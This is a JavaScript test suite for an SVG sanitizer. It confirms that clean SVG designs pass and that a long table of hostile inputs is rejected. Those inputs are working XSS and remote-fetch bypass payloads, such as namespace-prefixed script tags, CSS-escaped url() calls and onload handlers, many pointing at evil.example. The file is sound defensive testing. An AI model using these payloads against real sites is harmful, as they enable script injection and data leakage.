import { test } from 'node:test';
import assert from 'node:assert/strict';
import { MAX_SVG_BYTES, sanitizeSvg } from '../sidecar/svg.js';

const SVG = 'http://www.w3.org/2000/svg';
const XHTML = 'http://www.w3.org/1999/xhtml';
const XLINK = 'http://www.w3.org/1999/xlink';
const NS = `xmlns="${SVG}"`;
const doc = (inner, attrs = NS) => `<svg ${attrs} viewBox="0 0 10 10">${inner}</svg>`;

test('accepts a clean design and keeps it byte-identical', () => {
  const svg = doc('<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient><path id="p" d="M0 0 H10"/></defs>' +
    '<rect width="10" height="10" fill="url(#g)"/><text><textPath href="#p">Hi</textPath></text><use xlink:href="#p"/>');
  const r = sanitizeSvg(svg);
  assert.equal(r.ok, true, r.reason);
  assert.equal(r.svg, svg);
});

test('adds the SVG namespace when the root lacks it, and allows an XML prolog and comments', () => {
  const r = sanitizeSvg('<?xml version="1.0"?>\n<!-- art -->\n<svg viewBox="0 0 1 1"><rect width="1" height="1"/></svg>\n');
  assert.equal(r.ok, true, r.reason);
  assert.match(r.svg, /^<\?xml version="1.0"\?>\n<!-- art -->\n<svg xmlns="http:\/\/www.w3.org\/2000\/svg" viewBox/);
});

test('allows the SVG vocabulary designs use: xlink, filters, gradients, patterns, text, animation', () => {
  const svg = doc(
    '<defs><filter id="f"><feGaussianBlur stdDeviation="1"/><feOffset dx="1"/><feMerge><feMergeNode/></feMerge></filter>' +
      '<radialGradient id="r"><stop offset="0"/></radialGradient><pattern id="p" width="2" height="2"><circle r="1"/></pattern>' +
      '<clipPath id="c"><ellipse rx="1" ry="1"/></clipPath><mask id="m"><polygon points="0,0 1,1"/></mask><marker id="k"><polyline points="0,0 1,1"/></marker>' +
      '<symbol id="s"><line x2="1"/></symbol></defs>' +
      '<style><![CDATA[ rect { fill: url(#r); } ]]></style>' +
      '<use xlink:href="#s"/><text xml:space="preserve"><tspan>Hi</tspan></text>' +
      '<rect width="1" height="1"><animate attributeName="opacity" values="0;1" dur="1s"/><animateTransform attributeName="transform" type="rotate"/></rect>',
    `${NS} xmlns:xlink="${XLINK}"`,
  );
  const r = sanitizeSvg(svg);
  assert.equal(r.ok, true, r.reason);
});

test('allows embedded png/jpeg/webp images', () => {
  assert.equal(sanitizeSvg(doc('<image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/>')).ok, true);
  assert.equal(sanitizeSvg(doc('<image href="data:image/jpeg;base64,/9j/4AAQ" width="1" height="1"/>')).ok, true);
});

const rejected = {
  'oversized document': doc(`<desc>${'x'.repeat(MAX_SVG_BYTES)}</desc>`),
  'missing svg root': '<html><body>hi</body></html>',
  'script element': doc('<script>alert(1)</script>'),
  'script element, mixed case': doc('<ScRiPt>alert(1)</ScRiPt>'),
  foreignObject: doc('<foreignObject><div>x</div></foreignObject>'),
  'entity declaration': `<!DOCTYPE svg [<!ENTITY x "y">]>${doc('')}`,
  doctype: `<!DOCTYPE svg>${doc('')}`,
  'event handler': doc('<rect onclick="x()"/>'),
  'event handler after slash': `<svg/onload=alert(1) ${NS}></svg>`,
  'javascript url': doc('<a href="javascript:alert(1)"><text>x</text></a>'),
  'entity-encoded javascript url': doc('<a href="&#106;avascript&#58;alert(1)"><text>x</text></a>'),
  'external href': doc('<a href="https://evil.example/"><text>x</text></a>'),
  'external xlink:href': doc('<use xlink:href="other.svg#x"/>'),
  'external image': doc('<image href="https://evil.example/a.png"/>'),
  'svg data uri image': doc('<image href="data:image/svg+xml;base64,PHN2Zz4="/>'),
  '@import in style': doc('<style>@import url(https://evil.example/x.css);</style>'),
  'external url() in style': doc('<style>rect{fill:url(https://evil.example/x)}</style>'),
  'external url() in attribute': doc('<rect fill="url(http://evil.example/#g)"/>'),
  'animated href': doc('<a><set attributeName="href" to="#x"/></a>'),
  'iframe element': doc('<iframe src="x"/>'),
  'stylesheet processing instruction': `<?xml-stylesheet href="x.css"?>${doc('')}`,
  'non-svg root': `<g ${NS}><svg></svg></g>`,
  'content after the root': `${doc('')}<rect/>`,
  'foreign root namespace': doc('', 'xmlns="http://www.w3.org/1999/xhtml"'),
  // Bypasses found by fuzzing the old literal-name checks (SEC-1). Each of these ran script, fetched
  // a remote resource or navigated when the sanitized file was opened outside the artifact CSP.
  'svg-namespace-prefixed script': doc(`<x:script xmlns:x="${SVG}">document.title=1</x:script>`),
  'xhtml-namespace script': doc(`<h:script xmlns:h="${XHTML}">document.title=1</h:script>`),
  'xhtml script with src': doc(`<h:script xmlns:h="${XHTML}" src="http://evil.example/x.js"></h:script>`),
  'prefixed script with a digit-prefixed href': doc(`<x:script xmlns:x="${SVG}" xmlns:x1="${XLINK}" x1:href="http://evil.example/x.js"/>`),
  'prefixed foreignObject': doc(`<s:foreignObject xmlns:s="${SVG}"><div/></s:foreignObject>`),
  'xhtml img': doc(`<h:img xmlns:h="${XHTML}" src="http://evil.example/a.png"/>`),
  'xhtml iframe': doc(`<h:iframe xmlns:h="${XHTML}" src="http://evil.example/"/>`),
  'xhtml embed': doc(`<h:embed xmlns:h="${XHTML}" src="http://evil.example/"/>`),
  'xhtml meta refresh': doc(`<h:meta xmlns:h="${XHTML}" http-equiv="refresh" content="0;url=http://evil.example/nav"/>`),
  'href with a digit prefix': doc(`<image xmlns:x1="${XLINK}" x1:href="http://evil.example/a.png"/>`),
  'href with an underscore prefix': doc(`<image xmlns:x_a="${XLINK}" x_a:href="http://evil.example/a.png"/>`),
  'href with a dotted prefix': doc(`<image xmlns:q.1="${XLINK}" q.1:href="http://evil.example/a.png"/>`),
  'xhtml img via a default namespace': doc(`<img xmlns="${XHTML}" src="http://evil.example/a.png"/>`),
  'xhtml meta via a default namespace': doc(`<meta xmlns="${XHTML}" http-equiv="refresh" content="0"/>`),
  'non-svg element in the svg namespace': doc('<meta http-equiv="refresh" content="0"/>'),
  'img element with an embedded png': doc('<img src="data:image/png;base64,iVBORw0KGgo="/>'),
  'foreign prefix declaration': doc('<rect/>', `${NS} xmlns:h="${XHTML}"`),
  'xlink prefix bound to another namespace': doc('<rect/>', `${NS} xmlns:xlink="${XHTML}"`),
  'CSS-escaped url()': doc('<style>rect{fill:u\\72l(http://evil.example/x)}</style>'),
  'CSS-escaped @import': doc('<style>@\\69mport "http://evil.example/x.css";</style>'),
  'CSS escape in a presentation attribute': doc('<rect fill="u\\72l(http://evil.example/x)"/>'),
  'image-set()': doc('<style>rect{background:image-set("http://evil.example/x.png" 1x)}</style>'),
  '-webkit-image-set()': doc('<style>rect{background:-webkit-image-set("http://evil.example/x.png" 1x)}</style>'),
  'src() function': doc('<style>rect{background:src("http://evil.example/x.png")}</style>'),
  'animating a prefixed href': doc('<a><set attributeName="x:href" to="http://evil.example/"/></a>'),
  'animating src': doc('<a><animate attributeName="src" to="x"/></a>'),
  'animating an event handler': doc('<animate attributeName="onbegin" to="x"/>'),
  'prefixed event handler attribute': doc('<rect x:onclick="x()"/>'),
  'xml:base': doc('<g xml:base="https://evil.example/x.svg"><use href="#x"/></g>'),
};

for (const [name, svg] of Object.entries(rejected)) {
  test(`rejects: ${name}`, () => {
    const r = sanitizeSvg(svg);
    assert.equal(r.ok, false);
    assert.equal(r.svg, null);
    assert.ok(r.reason.length > 0);
  });
}

test('rejects non-string input', () => {
  assert.equal(sanitizeSvg(null).ok, false);
  assert.equal(sanitizeSvg({}).ok, false);
});
